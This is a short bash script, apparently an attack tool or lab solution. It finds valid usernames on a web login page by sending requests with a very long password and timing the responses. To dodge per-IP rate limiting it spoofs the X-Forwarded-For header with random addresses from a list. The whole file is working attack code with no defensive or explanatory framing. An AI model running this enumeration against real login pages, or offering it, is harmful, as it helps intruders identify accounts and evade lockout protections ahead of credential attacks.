#!/bin/bash

URL=$1
pass=`printf 'A%.0s' {1..1000}`
echo "Finding a valid username..."

for user in $(cat usernames.txt)
do
    if [ $(curl -s --data "username=$user&password=$pass" -H "X-Forwarded-For: `shuf -n 1 hosts.txt`" -o /dev/null --connect-timeout 3 --retry 3 -w %{time_total} $URL | cut -d "." -f 1) -ge 4 ]
    then 
        echo "Valid username is: $user"
        break
    fi
done
